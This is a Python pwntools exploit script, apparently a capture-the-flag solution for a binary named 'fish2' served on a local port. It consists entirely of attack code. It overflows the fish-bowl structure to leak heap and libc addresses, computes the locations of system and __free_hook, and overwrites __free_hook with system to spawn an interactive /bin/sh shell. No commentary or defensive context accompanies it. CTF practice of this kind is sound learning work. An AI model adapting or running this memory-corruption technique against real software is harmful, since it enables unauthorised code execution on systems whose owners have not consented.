#!/usr/bin/python

from pwn import *

DEBUG = False

#p = process("./fish2")
p = remote("localhost", 19003)

system_offset = 0x45380
puts_offset = 0x6f5d0
freehook_offset = 0x3c57a8

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def buyFish():
  r(">>>> ")
  p.sendline("1")

def sellAll():
  r(">>>> ")
  p.sendline("2")

def feedAll():
  r(">>>> ")
  p.sendline("3")

def showInfo():
  r(">>>> ")
  p.sendline("6")

def changeBowlName(name):
  r(">>>> ")
  p.sendline("7")

  r("$\n")
  p.send(name)

  sleep(0.1)

def changeFishName(num, name):
  r(">>>> ")
  p.sendline("8")

  r(">>>> ")
  p.sendline(str(num))

  p.send(name)
  sleep(0.1)

def changeFishAscii(num, fish_ascii):
  r(">>>> ")
  p.sendline("9")

  r("Number\n>>>> ")
  p.sendline(str(num))

  p.send(fish_ascii)
  sleep(0.1)

def feedAndSell():
  for i in xrange(12):
    feedAll()
  sellAll()

# Name

some_type = 0x40313f
puts_ptr = 0x604f10

name = "/bin/sh\0"
name = name.ljust(0x100, "\x00")

name += p64(0x403750) * 2
name += p64(0)
name += p64(0) * 3
name += p64(1) * 2 	# Exp, weight, price
name += "AAAAAAA\0"	# Ascii
name += p64(puts_ptr)	# Name / Ascii
name += p64(puts_ptr)	

r("Name : ")
p.sendline(name)

# FishBowl overflow

for i in xrange(1, 5):
  for j in xrange(i):
    buyFish()
  feedAndSell()

for i in xrange(17):
  buyFish()

# Leak

showInfo()

r("Money : ")
heap_leak = int(r("$")[:-1])
name_buf = heap_leak - 0xaf0

print "Heap leak: 0x%x" % heap_leak

payload = ""
payload = payload.ljust(0x10, "\x00")
payload += p64(name_buf)
payload += p64(name_buf + 0x8)

changeBowlName(payload)
showInfo()

r("Name  : ")
puts_leak = r("|")[4:-7]
puts_addr = u64(puts_leak.ljust(0x8, "\x00"))

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
freehook_addr = libc_base + freehook_offset

print "puts_addr: 0x%x" % puts_addr

changeFishAscii(2, p64(freehook_addr))
changeFishName(1, p64(system_addr))

p.sendline("0")

p.interactive()

p.close()
